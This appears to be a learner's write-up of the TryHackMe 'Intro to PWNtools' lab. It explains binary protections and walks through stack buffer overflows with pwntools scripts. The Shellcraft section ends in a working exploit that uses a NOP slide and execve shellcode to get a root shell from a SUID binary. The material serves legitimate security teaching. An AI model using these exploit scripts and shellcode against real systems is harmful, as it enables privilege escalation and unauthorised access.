# Intro to PWNtools [TryHackMe](https://tryhackme.com/room/introtopwntools)

--------------------------------------------------------------------------------

![](./.assets/logo.png)

--------------------------------------------------------------------------------

## Index

### - [Checksec](#checksec)

### - [Cyclic](#cyclic)

### - [Networking](#networking)

### - [Shellcraft](#shellcraft)

### - [Additional Resources](#additional-resources)

--------------------------------------------------------------------------------

### Checksec

Terminology:

```
- RELRO: Relocation Read-Only
    - Makes the `global offset table` read-only after the linker resolves the functions to it.
    - Important in techniques such as `ret-to-libc` attack
    - [Hardening ELF binaries using RELRO](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro)

- Stack Canaries
    - Tokens placed after a stack to detect a stack overflow.
    - They sit beside the stack in memory (where prog. vars are stored) and if there is a stack overflow - the canary will be corrupted. This allows the program to detect a buffer-overflow and shut it down.
    - [Stack Canaries, gingerly sidestepping the cage](https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/)

- NX: Non-executable
    - If this option is enabled, the memory segments can be **either** writable **executable** but not both.
    - Prevents malicious injection such as shellcode from either being written into the file then executed or executed after being written.
    - A vunerable binary will have `RWX` meaning it has segments which are writable **and** executable.
    - [Executable Space Protection](https://en.wikipedia.org/wiki/Executable_space_protection)

- PIE: Position Independent Executable
    - Loads the program dependancies into random memory locations to increase the difficulty of attacks
    - [PIE Redhat Blog](https://access.redhat.com/blogs/766093/posts/1975793)
```

For an overview of each checksec quality: [High level explaination on some binary executable security](https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/)

`intro2pwn1`

```
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

`intro2pwn2`

```
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Cause a buffer overflow on `intro2pwn1`. What was detected?

```bash
echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | ./intro2pwn1
```

Do the same for `intro2pwn2`

```bash
echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | ./intro2pwn2
```

`*** stack smashing detected ***: <unknown> terminated Aborted (core dumped)`

`Segmentation fault (core dumped)`

--------------------------------------------------------------------------------

### Cyclic

```
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x80480
```

You can view permissions of the file with `ls -l`

```
-rwsrwxr-x 1 dizmas dizmas 7444 May 19 02:25 intro2pwn3
```

Notice the `s`. That stands for SUID which is set in this program. Meaning when we run the program - it will have the Effective Permissions of the `dizmas` user.

We can exploit this program through the `get` command used by the program. It has `24` bytes allocated to it and if more than `24` bytes of data is given - a buffer overflow will occur

In doing a Buffer Overflow, we would like to overwrite the `IP` Instruction Pointer (not the networking one ;) (`EIP` on 32 bit machines and `RIP` on 64 bit machines)

```python
#!/usr/bin/env python

from pwn import *

padding = cyclic(cyclic_find('jaaa'))

eip = p32(0xdeadbeef)

payload = padding + eip

print(payload)
```

```python
#!/usr/bin/env python

from pwn import *

padding = cyclic(cyclic_find('jaaa'))

eip = p32(0x8048536)

payload = padding + eip

print(payload)
```

I had a few issues with `gdb` not wanting to run it properly with the exploit so instead I simply used:

```bash
python pwn_cyclic.py | ./intro2pwn3
```

Which simply funnels the output from the `python` command into the next. Dumping the flag onto `stdout`

--------------------------------------------------------------------------------

### Networking

```
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/networking/serve_test'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```python
#!/usr/bin/env python

from pwn import *

connect = remote('127.0.0.1', 1337)

print(connect.recvn(18))

payload = "\x41" * 32 + p32(0xdeadbeef)

connect.send(payload)

print(connect.recvn(34))
```

--------------------------------------------------------------------------------

### Shellcraft

ASLR: Address Space Layout Randomization

```
- Randomises where in memory the executable is loaded each and everytime it is run
```

```bash
cyclic 200 > payload
gdb intro2pwnFinal
# r < payload
# EIP 'taaa'
```

Developing an exploit to gain a root shell by exploiting a binary file with its SUID bit set.

Rather than attempt to get another function to run like it was done earlier - we can add custom shellcode which will spawn a reverse shell on our machine

To do this we must find the `EIP` as before and direct it to the stack where we placed our code.

The top of the stack named `ESP` points to the top of the stack - and we need an offset to the `ESP` location.

Finding the offset is a matter of trial-and-error. In this scenario, it is given as 200

In assembly, there is an instruction called `NOP` which is `0x90` in hex form and passes the `EIP` to the next space in memory.

By assigning a large amount of `NOPS` we can make a slide down which our shellcode is located.

Before using the shellcode, we will use `0xcc` which is the breakpoint instruction

```python
#!/usr/bin/env python

from pwn import *

padding = cyclic(cyclic_find('taaa'))

eip = p32(0xffffd510 + 200)

nop_slide = "\x90" * 1000

shellcode = "\xcc"

payload = padding + eip + nop_slide + shellcode

print(payload)
```

We can now store its output in a file and run it with `gdb` to check if it worked.

```
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal < output
Hello There. Do you have an input for me?

Program received signal SIGTRAP, Trace/breakpoint trap.
0xffffd8f9 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────
 EAX  0xffffd4c0 ◂— 0x61616161 ('aaaa')
 EBX  0x61616172 ('raaa')
 ECX  0xf7fc15c0 (_IO_2_1_stdin_) ◂— mov    byte ptr [eax], ah /* 0xfbad2088 */
 EDX  0xf7fc289c (_IO_stdfile_0_lock) ◂— 0
 EDI  0x0
 ESI  0xf7fc1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
 EBP  0x61616173 ('saaa')
 ESP  0xffffd510 ◂— 0x90909090
 EIP  0xffffd8f9 ◂— 0x2e2a3a00
```

And this confirms we have control over the `ESP`.

Now we can exploit this program and add our shellcode to spawn a root shell.

```python
#!/usr/bin/env python

from pwn import *

proc = process('./intro2pwnFinal')
proc.recvline()

padding = cyclic(cyclic_find('taaa'))

eip = p32(0xffffd510 + 200)

nop_slide = "\x90" * 1000

shellcode =  "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

payload = padding + eip + nop_slide + shellcode

proc.send(payload)

proc.interactive()
```

Run it and...

We are root! And can grab the file from `/root/flag.txt`

--------------------------------------------------------------------------------

### Additional Resources

- [Live Overflow's YouTube playlist](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)

- [Exploit Education](https://exploit.education/)

- [Nightmare CTF GitHub Repo](https://github.com/guyinatuxedo/nightmare/tree/master/modules)

--------------------------------------------------------------------------------

![](./.assets/complete.png)

--------------------------------------------------------------------------------
